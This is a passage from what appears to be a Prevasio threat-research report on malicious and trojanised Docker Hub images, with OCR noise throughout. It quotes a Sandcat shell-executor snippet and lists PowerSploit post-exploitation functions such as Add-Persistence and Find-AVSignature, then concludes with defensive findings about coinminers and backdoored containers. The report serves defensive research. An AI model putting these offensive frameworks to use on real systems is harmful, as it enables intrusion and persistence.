a shell executor, effectively turning Sandcat into a backdoor trojan:

func (s *Sh) Run(command string, timeout int) ([]byte, string, string) {
return runShellExecutor(*exec.Command(s.path, append(s.execArgs, command)...), timeout)

33 https://www.mitre.org/research/technology-transfer/open-source-software/caldera%E2%84%A2
34 https://malware.prevasio.com/report/cyb3rward0g/caldera

35 https://github.com/mitre/sandcat

36 https://caldera.readthedocs.io/en/latest/Plugin-library.html#sandcat-54ndc47

eser




Another extension for Sandcat, called Donut,*’ is a cross-platform module that allows file-less execution of
various assemblies in memory.

Security industry is already raising concerns?® pa
that proliferation of GoLang, file-less code and da
Powershell into the world of malware is the most
unwelcome development over the recent years.

Costin Raiu @

What are the most devastating malware developments
during the past years? My top 3: 1. Golang 2. Fileless 3.

Ly. ; Powershell
Considering these techniques are cross-platform,

the offensive dockerized toolkits can easily be
adopted not only by the red teams, but also by
adversaries to mount attacks against Windows,
Linux, and MacOS-based targets.

PowerSploit

Another example of an offensive framework is PowerSploit,°? found to be dockerized in the image
guerillamos/powersploit.”

Originally designed as a framework for Windows only, offensive PowerSploit framework can now be
deployed upon the parent image microsoft/powershell® — a dockerized image of PowerShell Core,
designed by Microsoft is a cross-platform framework for Windows, Linux, and macOS.

As a result, the dockerized PowerSploit can now run on Linux, exposing another dangerous trend — the
convergence of Linux and Windows OS, that allows proliferation of Windows threats into the world of Linux:

PowerShell v6.0.2
Copyright (c) Microsoft Corporation. All rights reserved.

https://aka.ms/pscore6-docs
Type ‘help’ to get help.

PS /> Get-Command -Module PowerSploit

CommandType Name Source
Function Add-NetUser

Function Add-ObjectAcl

Function Add-Persistence
Function Convert-NameToSid
Function Convert-NT4toCanonical
Function Convert-SidToName
Function Copy-ClonedFile
Function Find-AVSignature

PowerSploit
PowerSploit
PowerSploit
PowerSploit
PowerSploit
PowerSploit
PowerSploit
PowerSploit

WWwWwWwWwww ww
2SOSO00
2ST
®2SOTTSOOO

3/ https://github.com/TheWover/donut

38 https://twitter.com/craiu/status/1306491569953013760

59 https://attack.mitre.org/software/S0194/

60 https://malware.prevasio.com/report/guerillamos/powersploit
61 https://hub.docker.com/_/microsoft-powershell




Conclusion

The investigation conducted by Prevasio illustrates that Linux OS, and Linux containers in particular are not
immune to security risks. Docker, the most popular standard of Linux containers, and Docker Hub, its online
container registry, are not immune to security risks either.

Our research shows that the primary security risk is enabled by critical vulnerabilities. More than half of
all container images hosted by Docker Hub, contain one or more critical vulnerability, and are, therefore,
potentially exploitable.

Another risk is in the fact that out of 4 million publicly available images, 6,432 are found to contain
malicious or potentially harmful code.

While most of the potentially harmful containers are represented with cryptocurrency miners (coinminers),
there is also a fair amount of trojanized images of popular web platforms, such as WordPress, Apache
Tomcat, or Jenkins.

If a company’s developer takes a shortcut by fetching a pre-built image, instead of composing a new image
from scratch, there is a viable risk that such pre-built image might come pre-trojanised. If such image ends
up in production, the attackers may potentially be able to access such containerized applications remotely
via a backdoor.

Our analysis of the malicious container images revealed a wide usage of cross-platform code, in particular
GoLang, .NET Core and PowerShell Core. The portability of the cross-platform code is lucrative for the
attackers as it increases ROI for their efforts. That is, malicious code they write does not have to be written
multiple times for multiple platforms. It can be written once, and run everywhere, including Linux containers.

As a result, a large number of offensive security frameworks and post-exploitation tools, such as Mimikatz or
Caldera, can now be found in Linux Docker containers, facilitating the proliferation of well-evolved malicious
Windows techniques into the world of Linux.

Our analysis of malicious containers also shows that quite a few images contain a dynamic payload. That is,
an image in its original form does not have a malicious binary. However, at runtime, it might be scripted to
download a source of a coinminer, to then compile and execute it.

A dynamic analysis sandbox, such as Prevasio Analyzer, is the only solution that provides a behavioral
analysis of Docker containers. It is built to reveal malicious intentions of Docker containers by executing
them in its own virtual environment, revealing a full scope of their behavior.

If you are interested to inspect the malicious or potentially harmful containers discovered by Prevasio at
Docker Hub, please feel free to visit our website at:

https://malware.prevasio.com

For your convenience, we have also provided all reports in JSON and PDF formats.

Prevasio Pty Ltd | https://prevasio.com | Copyright © 2020 All Rights Reserved